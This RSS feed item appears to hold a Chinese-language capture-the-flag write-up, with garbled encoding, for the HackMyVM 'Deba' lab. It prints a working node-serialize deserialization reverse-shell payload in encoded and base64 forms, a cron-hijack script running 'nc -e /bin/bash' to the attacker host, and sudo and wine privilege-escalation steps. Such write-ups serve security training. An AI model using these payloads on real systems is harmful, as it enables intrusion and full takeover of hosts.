<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.ico</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sat, 28 Dec 2024 14:25:45 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sat, 28 Dec 2024 14:25:43 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[48.deba]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ç›®å½•æ‰«æ" data-href="#2.2. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.2._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç›®å½•æ‰«æ</a>


<br><a data-tooltip-position="top" aria-label="3. nodejsååºåˆ—åŒ– (CVE-2017-5941)" data-href="#3. nodejsååºåˆ—åŒ– (CVE-2017-5941)" href="https://www.c1trus.top/about:blank#3._nodejsååºåˆ—åŒ–_(CVE-2017-5941)" class="internal-link" target="_self" rel="noopener nofollow">3. nodejsååºåˆ—åŒ– (CVE-2017-5941)</a>
<br><a data-tooltip-position="top" aria-label="4. www-dataææƒlowç”¨æˆ·" data-href="#4. www-dataææƒlowç”¨æˆ·" href="https://www.c1trus.top/about:blank#4._www-dataææƒlowç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">4. www-dataææƒlowç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="5. å®šæ—¶ä»»åŠ¡ææƒ" data-href="#5. å®šæ—¶ä»»åŠ¡ææƒ" href="https://www.c1trus.top/about:blank#5._å®šæ—¶ä»»åŠ¡ææƒ" class="internal-link" target="_self" rel="noopener nofollow">5. å®šæ—¶ä»»åŠ¡ææƒ</a>
<br><a data-tooltip-position="top" aria-label="6. wineå‘½ä»¤ ææƒroot" data-href="#6. wineå‘½ä»¤ ææƒroot" href="https://www.c1trus.top/about:blank#6._wineå‘½ä»¤_ææƒroot" class="internal-link" target="_self" rel="noopener nofollow">6. wineå‘½ä»¤ ææƒroot</a><br>
- <a data-tooltip-position="top" aria-label="6.1. åˆ©ç”¨CSè·å–root" data-href="#6.1. åˆ©ç”¨CSè·å–root" href="https://www.c1trus.top/about:blank#6.1._åˆ©ç”¨CSè·å–root" class="internal-link" target="_self" rel="noopener nofollow">6.1. åˆ©ç”¨CSè·å–root</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Deba" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Deba</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=nolose" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=nolose" target="_blank">nolose</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸<br>
å‚è€ƒæ–‡ç«  <a rel="noopener nofollow" class="external-link" href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a>
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# nmap 192.168.56.26 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 11:28 EST
Nmap scan report for 192.168.56.26
Host is up (0.00075s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:2F:C3:52 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.80 seconds

<br>é¦–é¡µæ˜¯apache<br>
<img alt="Pasted image 20241227002954" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png" referrerpolicy="no-referrer"><br>
3000ç«¯å£é¦–é¡µ<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# curl http://192.168.56.26:3000/
Hello World 
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# dirsearch -u http://192.168.56.26 -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/deba/reports/http_192.168.56.26/_24-12-26_11-30-56.txt

Target: http://192.168.56.26/

[11:30:56] Starting:
[11:31:09] 301 -  321B  - /node_modules  -&gt;  http://192.168.56.26/node_modules/
[11:31:09] 200 -  992B  - /node_modules/
[11:31:09] 200 -  116B  - /package.json
[11:31:09] 200 -   32KB - /package-lock.json
[11:31:12] 200 -  386B  - /server.js

Task Completed

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# dirsearch -u http://192.168.56.26:3000 -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/deba/reports/http_192.168.56.26_3000/_24-12-26_11-31-27.txt

Target: http://192.168.56.26:3000/

[11:31:27] Starting:

Task Completed

<br>å‘ç°ä¸€ä¸ªnodejsçš„æºç <br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# curl http://192.168.56.26//server.js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
app.get('/', function(req, res) {
    if (req.cookies.profile) {
        var str = new Buffer(req.cookies.profile,'base64').toString();
        var obj = serialize.unserialize(str);
    if (obj.username) {
        res.send("Hello " + escape(obj.username));
    }

    } else {
        res.cookie('profile',"eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", { maxAge: 900000, httpOnly: true});
    }
res.send("Hello World");
});
app.listen(3000);
<br>
åˆ†æä»£ç å¯çŸ¥ è®¿é—® http://192.168.56.26:3000/ Web åº”ç”¨ç¨‹åºä¸­ä¼šæ£€æŸ¥å®¢æˆ·ç«¯è¯·æ±‚ä¸­æ˜¯å¦å¸¦æœ‰åä¸º profile çš„ Cookieï¼Œ<br>
å¦‚æœæœ‰ï¼Œåˆ™ä¼šå°†å…¶è§£ç ä¸º Base64 å­—ç¬¦ä¸²ï¼Œå¹¶ä½¿ç”¨ serialize.unserialize å°†å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºå¯¹è±¡ï¼Œ<br>
ç”±äºCookieæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¶æ„cookieæ¥åˆ©ç”¨è¿™ä¸ªååºåˆ—åŒ–æ¼æ´
<br>æˆ‘ä»¬å¯ä»¥å…ˆç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œå¦‚ä¿®æ”¹åå­—<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# echo "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=" |base64 -d
{"username":"ajin","country":"india","city":"bangalore"} 

ä¿®æ”¹usernameçš„å€¼
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# echo -n "{"username":"c1trus","country":"india","city":"bangalore"}"  |base64
e3VzZXJuYW1lOmMxdHJ1cyxjb3VudHJ5OmluZGlhLGNpdHk6YmFuZ2Fsb3JlfQ==

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€#  curl http://192.168.56.26:3000/ -b "profile=eyJ1c2VybmFtZSI6ImMxdHJ1cyIsImNvdW50cnkiOiJpbmRpYSIsImNpdHkiOiJiYW5nYWxvcmUifQ=="
Hello c1trus 
<br>å¯ä»¥å‘ç°ç¡®å®è¢«ä¿®æ”¹äº†<br>ä¸‹é¢æˆ‘ä»¬å°è¯•åˆ©ç”¨è¿™ä¸ªååºåˆ—åŒ–æ¼æ´ è¿›è¡Œåå¼¹shell<br>
è¿™é‡Œæœ‰ä¸€ä¸ªç°æˆçš„åå¼¹shellåˆ©ç”¨è„šæœ¬<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</a><br><br>
è¿™é‡Œå…¶å®å°±æ˜¯åˆ©ç”¨çš„ <a data-tooltip-position="top" aria-label="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941" rel="noopener nofollow" class="external-link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941" target="_blank">CVE-2017-5941</a><br>
å¦‚æœæ„Ÿå…´è¶£ï¼Œè¿™é‡Œæœ‰åœ¨çº¿çš„<a data-tooltip-position="top" aria-label="https://yunjing.ichunqiu.com/cve/detail/923?pay=2" rel="noopener nofollow" class="external-link" href="https://yunjing.ichunqiu.com/cve/detail/923?pay=2" target="_blank">å…è´¹é¶åœº</a>è®©ä½ å¤ç°
<br>åˆ©ç”¨è„šæœ¬ç”Ÿæˆåå¼¹shellçš„payload<br>
æ³¨æ„ :è„šæœ¬è¦ç”¨python2è¿è¡Œ<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# python2 nodejsshell.py 192.168.56.6 1234
[+] LHOST = 192.168.56.6
[+] LPORT = 1234
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,53,54,46,54,34,59,10,80,79,82,84,61,34,49,50,51,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
<br>ç„¶åå¯¹payloadè¿›è¡Œbase64ç¼–ç <br>æ„é€ åºåˆ—åŒ–ä»£ç <br>{"c1trus": "_$$ND_FUNC$$_function () { ä¸Šé¢ç”Ÿæˆçš„payload }()"}
<br>ç„¶åå¯¹è¿™ä¸ªæ„é€ å‡ºæ¥çš„payloadè¿›è¡Œbase64ç¼–ç <br>eyJjMXRydXMiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uICgpIHtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNTcsNTAsNDYsNDksNTQsNTYsNDYsNTMsNTQsNDYsNTQsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNDksNTAsNTEsNTIsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpIH0oKSJ9
<br>å¼€å¯ç›‘å¬ å¹¶ä½¿ç”¨è¿™ä¸ªpayloadä½œä¸ºcookieç„¶åè®¿é—®<br>curl http://192.168.56.26:3000/ -b "profile=base64åçš„payload"
<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# pwncat-cs -lp 1234

[03:51:04] Welcome to pwncat ğŸˆ!                                                                  __main__.py:164
[03:51:09] received connection from 192.168.56.26:44754                                                bind.py:84
[03:51:09] 0.0.0.0:1234: normalizing shell path                                                    manager.py:957
           0.0.0.0:1234: upgrading from /usr/bin/dash to /usr/bin/bash                             manager.py:957
           192.168.56.26:44754: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@debian:/var/www$ whoami
www-data

<br><br>(remote) www-data@debian:/home/low$ sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on debian:
    (ALL : low) NOPASSWD: /usr/bin/python3 /home/low/scripts/script.py

(remote) www-data@debian:/home/low/scripts$ ls -la
total 16
drwxr-xr-x 2 low      low      4096 may  7  2021 .
drwxr-xr-x 8 low      low      4096 may  7  2021 ..
-rwxr-xr-x 1 www-data www-data   88 may  7  2021 main.py
-rw-r--r-- 1 low      low        80 may  7  2021 script.py

(remote) www-data@debian:/home/low/scripts$ cat script.py
import main
import os

print("\n")
os.system("ip a | grep enp0s3")

print("\n")

<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨ low ç”¨æˆ·æ‰§è¡Œ script.py è€Œä¸” script.py å¼•å…¥äº† main.py æˆ‘ä»¬å½“å‰ç”¨æˆ·å¯ä»¥ä¿®æ”¹è¿™ä¸ª main.py æ–‡ä»¶<br>ä¿®æ”¹ mian.py<br>(remote) www-data@debian:/home/low/scripts$ vi main.py
(remote) www-data@debian:/home/low/scripts$ cat main.py
from os import system as main
print("\n")
print("Just main")
main("whoami")
main("/bin/bash")

<br>sudoææƒ<br>(remote) www-data@debian:/home/low/scripts$ sudo -u low python3 /home/low/scripts/script.py

low@debian:~/scripts$ whoami
low

low@debian:~$ cat user.txt
justdeserialize

<br><br>æˆ‘ä»¬ä½¿ç”¨ææƒè„šæœ¬è¿›è¡Œæ£€æµ‹å‘ç°å¯ä»¥åˆ©ç”¨çš„ç‚¹<br>*/1 *   * * *   debian /usr/bin/python3 /home/debian/Documentos/backup/dissapeared.py ; echo "Done" &gt;&gt; /home/debian/Documentos/log
<br>debian ç”¨æˆ·æ¯åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡ /home/debian/Documentos/backup/dissapeared.py<br>ä½†æ˜¯ backup/dissapeared.py å¹¶ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬è‡ªå·±å†™ä¸€ä¸ªå³å¯<br>low@debian:/home/debian/Documentos$  ls -la
total 12
drwxrwx---  2 debian low    4096 may  7  2021 .
drwxr-xr-x 15 debian debian 4096 may  8  2021 ..
-rw-r--r--  1 debian debian  600 dic 27 10:19 log
low@debian:/home/debian/Documentos$ mkdir backup
low@debian:/home/debian/Documentos$ vi dissapeared.py
low@debian:/home/debian/Documentos$ cat dissapeared.py
import os
os.system("nc -e /bin/bash 192.168.56.6 2233")

<br>ç­‰å¾…åå¼¹å³å¯<br><br>(remote) debian@debian:/home/debian$ sudo -l
Matching Defaults entries for debian on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User debian may run the following commands on debian:
    (ALL : root) NOPASSWD: /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
    
(remote) debian@debian:/home/debian$ ls -l /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
-rw-r--r-- 1 debian debian 21190 may  7  2021 /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe


<br>wine  ç®€å•æ¥è¯´å°±æ˜¯å…è®¸æˆ‘ä»¬åœ¨linuxä¸Šå…è®¸windowç¨‹åº<br>
æˆ‘ä»¬åªè¦å°† brainfuck.exe æ›¿æ¢æˆæˆ‘ä»¬çš„åé—¨ç¨‹åºå³å¯<br><br>noteè¿™é‡Œæˆ‘å…ˆç”¨msfè¯•ç€ç”Ÿæˆä¸€ä¸ªexeåé—¨ ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼Œwineæ‰§è¡Œåä¼šä¿å­˜<br>
ç„¶åç”¨CSç”Ÿæˆexeåé—¨å¯ä»¥è¿è¡Œä¸”ä¸ä¼šæŠ¥é”™<br>msfåé—¨æŠ¥é”™<br>(remote) debian@debian:/home/debian$ sudo -u root /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
0009:err:seh:setup_exception_record stack overflow 1200 bytes in thread 0009 eip 7bc46086 esp 00240e80 stack 0x240000-0x241000-0x340000


<br>ä¸Šä¼ CSç”Ÿæˆçš„åé—¨<br>
ç„¶åè¿è¡Œå³å¯<br><img alt="Pasted image 20241227182208" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227182208.png" referrerpolicy="no-referrer"><br>
ä½†æ˜¯ç”±äºæ˜¯linuxè¿è¡Œwindowçš„åé—¨ï¼Œ å¥½åƒæ‰§è¡Œä¸äº†å‘½ä»¤ï¼Œåæ­£æˆ‘æ²¡æœ‰æˆåŠŸ<br>
ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¿›è¡Œæ–‡ä»¶æ“ä½œï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥è¯»å–root.txt<br>ä½†æˆ‘è¿˜æ˜¯é€‰æ‹©å†™å…¬é’¥è¿›å»ç„¶åè¿æ¥<br>
<img alt="Pasted image 20241227182738" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227182738.png" referrerpolicy="no-referrer"><br>
æˆåŠŸæ‹¿ä¸‹root<br>â”Œâ”€â”€(rootã‰¿kali)-[/var/www/html]
â””â”€# ssh -i /root/.ssh/id_rsa root@192.168.56.26
The authenticity of host '192.168.56.26 (192.168.56.26)' can't be established.
ED25519 key fingerprint is SHA256:FQI6CQCD3uUo59olao5SmG/3b/R9quOafr6mSSLvdlA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.26' (ED25519) to the list of known hosts.
Linux debian 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@debian:~# whoami
root
root@debian:~# cat /root/root.txt
BoFsavetheworld

<br>æœ€åï¼Œå…¶å®è¿™é‡Œä¹Ÿå¯ä»¥ç”¨ pwnkit æ¼æ´è¿›è¡Œå†…æ ¸ææƒ]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/48.deba.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/48.deba.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 27 Dec 2024 11:09:05 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[9.Binary Trail]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
